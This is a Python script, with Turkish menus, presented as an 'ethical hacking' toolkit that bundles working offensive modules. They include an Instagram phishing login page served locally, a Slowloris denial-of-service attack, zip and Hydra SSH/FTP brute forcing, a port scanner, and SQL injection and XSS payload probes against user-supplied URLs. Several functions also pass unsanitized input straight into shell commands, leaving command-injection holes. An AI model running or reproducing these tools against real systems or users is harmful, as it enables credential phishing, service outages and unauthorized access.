#!/usr/bin/env python3
# Specter Alliance Toolkit v2.0 Ultra - Ethical Hacking Kit

import os
import sys
import socket
import hashlib
import base64
import zipfile
import requests
from time import sleep
from colorama import Fore, Style, init

try:
    from rich.console import Console
    from rich.table import Table
except ImportError:
    os.system("pip install rich")
    from rich.console import Console
    from rich.table import Table

init(autoreset=True)
console = Console()

def install_module(module):
    os.system(f"pip install {module}")

# Banner gösterimi
def banner():
    os.system("clear")
    console.print("""
███████╗███████╗███████╗ ██████╗████████╗███████╗██████╗ 
██╔════╝██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
█████╗  █████╗  █████╗  ██║        ██║   █████╗  ██████╔╝
██╔══╝  ██╔══╝  ██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗
███████╗███████╗███████╗╚██████╗   ██║   ███████╗██║  ██║
╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
""", style="bold red")
    console.print("          [v2.0 ULTRA] Full Ethical Hacking Toolkit by Specter Alliance\n", style="bold cyan")

def wait():
    input(Fore.YELLOW + "\n[ENTER] devam etmek için..." + Style.RESET_ALL)

def main_menu():
    table = Table(title="Ana Menü", show_header=True, header_style="bold green")
    table.add_column("Kod", justify="center")
    table.add_column("Modül", justify="left")
    table.add_row("01", "OSINT Araçları")
    table.add_row("02", "Hash / Base64 Araçları")
    table.add_row("03", "Fake Phishing Sayfası + Local Server")
    table.add_row("04", "Zip Brute Force")
    table.add_row("05", "Slowloris Saldırısı (Test)")
    table.add_row("06", "Port Tarayıcı (Socket)")
    table.add_row("07", "SQL Injection Test")
    table.add_row("08", "XSS Test")
    table.add_row("09", "HTTP Güvenlik Başlıkları")
    table.add_row("10", "SSH/FTP Brute Force (Hydra)")
    table.add_row("11", "Wordlist Üretici (Crunch Gerektirir)")
    table.add_row("12", "Shodan IP Araması (API Gerekir)")
    table.add_row("13", "Google Dork Arama")
    table.add_row("00", "Çıkış")
    console.print(table)

def osint_menu():
    console.print("""
[1] IP Bilgisi
[2] Whois Sorgusu
[3] Subdomain Arama (crt.sh)
[4] DNS Sorgusu
[0] Geri
""", style="magenta")
    choice = input("Seçiminiz: ")
    if choice == "1":
        ip = input("IP adresi giriniz: ")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}").json()
            for k, v in r.items():
                print(f"{k}: {v}")
        except:
            print("[!] Bağlantı hatası.")
    elif choice == "2":
        domain = input("Domain giriniz: ")
        os.system(f"whois {domain}")
    elif choice == "3":
        domain = input("Domain giriniz: ")
        print("[*] crt.sh subdomain sorgusu")
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json")
            data = r.json()
            subs = set()
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    if sub.endswith(domain):
                        subs.add(sub.strip())
            for sub in sorted(subs):
                print(sub)
        except:
            print("[!] Sorgu hatası.")
    elif choice == "4":
        domain = input("Domain giriniz: ")
        os.system(f"nslookup {domain}")
    wait()

def hash_tools():
    console.print("""
[1] Hash Oluştur (MD5 ve SHA256)
[2] Base64 Encode
[3] Base64 Decode
[0] Geri
""", style="magenta")
    c = input("Seçiminiz: ")
    if c == "1":
        d = input("Veri: ")
        print("MD5     :", hashlib.md5(d.encode()).hexdigest())
        print("SHA256  :", hashlib.sha256(d.encode()).hexdigest())
    elif c == "2":
        d = input("Veri: ")
        print("Base64  :", base64.b64encode(d.encode()).decode())
    elif c == "3":
        d = input("Base64 Kod: ")
        try:
            print("Çözüm:", base64.b64decode(d).decode())
        except:
            print("[!] Decode başarısız.")
    wait()

def phishing():
    html = """<html><head><title>Instagram Login</title></head><body>
<h2>Instagram Giriş</h2>
<form method="POST" action="log.txt">
Kullanıcı Adı: <input name="user"><br>
Şifre: <input type="password" name="pass"><br>
<input type="submit" value="Giriş Yap">
</form></body></html>"""
    with open("index.html", "w") as f:
        f.write(html)
    console.print("[*] Phishing HTML oluşturuldu: index.html", style="green")
    console.print("[*] Python HTTP server port 8080'de başlatılıyor...", style="green")
    try:
        os.system("nohup python3 -m http.server 8080 &")
    except:
        console.print("[!] Server başlatılamadı.", style="red")
    wait()

def zip_brute_force():
    zip_path = input("Zip dosyası yolu: ")
    wordlist = input("Wordlist dosyası yolu: ")
    try:
        zf = zipfile.ZipFile(zip_path)
        with open(wordlist, "r") as wl:
            for pwd in wl:
                pwd = pwd.strip()
                try:
                    zf.extractall(pwd=pwd.encode())
                    console.print(f"[✓] Şifre bulundu: {pwd}", style="green")
                    break
                except:
                    pass
            else:
                console.print("[!] Şifre bulunamadı.", style="red")
    except Exception as e:
        console.print(f"[!] Hata: {e}", style="red")
    wait()

def slowloris():
    target = input("Hedef IP: ")
    port = input("Port (default 80): ")
    port = int(port) if port else 80
    try:
        console.print("[*] Bağlantılar kuruluyor...", style="yellow")
        sockets = []
        for _ in range(200):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            sockets.append(s)
        console.print("[✓] Bağlantılar gönderildi.", style="green")
    except Exception as e:
        console.print(f"[!] Hata: {e}", style="red")
    wait()

def port_scan():
    target = input("Hedef IP: ")
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080]
    console.print(f"Tarama yapılıyor: {target}", style="yellow")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((target, port))
            console.print(f"[OPEN] Port {port}", style="green")
        except:
            pass
        finally:
            s.close()
    wait()

def sqli_test():
    url = input("Test edilecek URL (örnek: http://site.com/page.php?id=1): ")
    payloads = ["'", '"', "' OR '1'='1", '" OR "1"="1']
    vulnerable = False
    console.print("[*] SQL Injection test başlatıldı...", style="yellow")
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if any(err in r.text.lower() for err in ["sql syntax", "mysql", "syntax error", "unclosed quotation mark"]):
                console.print(f"[!] Potansiyel zafiyet bulundu: {test_url}", style="red")
                vulnerable = True
                break
        except Exception as e:
            console.print(f"[!] İstek hatası: {e}", style="red")
    if not vulnerable:
        console.print("[✓] SQL Injection bulunamadı.", style="green")
    wait()

def xss_test():
    url = input("Test edilecek URL (örnek: http://site.com/page.php?q=): ")
    payload = "<script>alert('XSS')</script>"
    test_url = url + payload
    console.print("[*] XSS test başlatıldı...", style="yellow")
    try:
        r = requests.get(test_url, timeout=5)
        if payload in r.text:
            console.print(f"[!] Potansiyel XSS açığı bulundu: {test_url}", style="red")
        else:
            console.print("[✓] XSS açığı bulunamadı.", style="green")
    except Exception as e:
        console.print(f"[!] İstek hatası: {e}", style="red")
    wait()

def http_headers_check():
    url = input("Kontrol edilecek URL (örnek: http://site.com): ")
    try:
        r = requests.get(url, timeout=5)
        console.print("[*] HTTP Başlıkları:", style="yellow")
        headers = r.headers
        for h in ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options", "Strict-Transport-Security", "Referrer-Policy"]:
            val = headers.get(h)
            if val:
                console.print(f"[✓] {h}: {val}", style="green")
            else:
                console.print(f"[!] {h} başlığı bulunamadı!", style="red")
    except Exception as e:
        console.print(f"[!] İstek hatası: {e}", style="red")
    wait()

def hydra_bruteforce():
    console.print("[*] Hydra brute force modülü için sistemde hydra yüklü olmalı!", style="yellow")
    target = input("Hedef IP veya domain: ")
    service = input("Servis (ssh, ftp, http-get, vs): ")
    userlist = input("Kullanıcı listesi dosyası: ")
    passlist = input("Parola listesi dosyası: ")
    cmd = f"hydra -L {userlist} -P {passlist} {target} {service}"
    console.print(f"Komut: {cmd}", style="cyan")
    os.system(cmd)
    wait()

def wordlist_creator():
    console.print("[*] Wordlist oluşturucu (crunch yüklü olmalı)", style="yellow")
    min_len = input("Minimum uzunluk: ")
    max_len = input("Maksimum uzunluk: ")
    charset = input("Karakter seti (örn: abc123): ")
    output = input("Kaydedilecek dosya adı: ")
    cmd = f"crunch {min_len} {max_len} {charset} -o {output}"
    console.print(f"Komut: {cmd}", style="cyan")
    os.system(cmd)
    wait()

def shodan_search():
    try:
        import shodan
    except ImportError:
        install_module("shodan")
        import shodan

    api_key = input("Shodan API Anahtarınız: ")
    api = shodan.Shodan(api_key)

    query = input("Arama sorgusu (örn: apache): ")
    try:
        results = api.search(query)
        console.print(f"[+] Toplam sonuç: {results['total']}", style="green")
        for result in results['matches'][:10]:
            console.print(f"IP: {result['ip_str']} - Port: {result['port']} - Veri: {result['data'][:100]}")
    except shodan.APIError as e:
        console.print(f"[!] Shodan Hata: {e}", style="red")
    wait()

def google_dork():
    dork = input("Google Dork ifadesi: ")
    query = f"https://www.google.com/search?q={dork}"
    console.print(f"Google araması: {query}", style="cyan")
    os.system(f"termux-open-url '{query}'")  # Termux için, Linux'ta xdg-open olabilir
    wait()

def exit_program():
    console.print("Çıkılıyor...", style="red")
    sys.exit()

def main():
    while True:
        banner()
        main_menu()
        choice = input("Seçiminiz: ").strip()
        if choice == "01":
            osint_menu()
        elif choice == "02":
            hash_tools()
        elif choice == "03":
            phishing()
        elif choice == "04":
            zip_brute_force()
        elif choice == "05":
            slowloris()
        elif choice == "06":
            port_scan()
        elif choice == "07":
            sqli_test()
        elif choice == "08":
            xss_test()
        elif choice == "09":
            http_headers_check()
        elif choice == "10":
            hydra_bruteforce()
        elif choice == "11":
            wordlist_creator()
        elif choice == "12":
            shodan_search()
        elif choice == "13":
            google_dork()
        elif choice == "00":
            exit_program()
        else:
            console.print("[!] Geçersiz seçim.", style="red")
            wait()

if __name__ == "__main__":
    main()
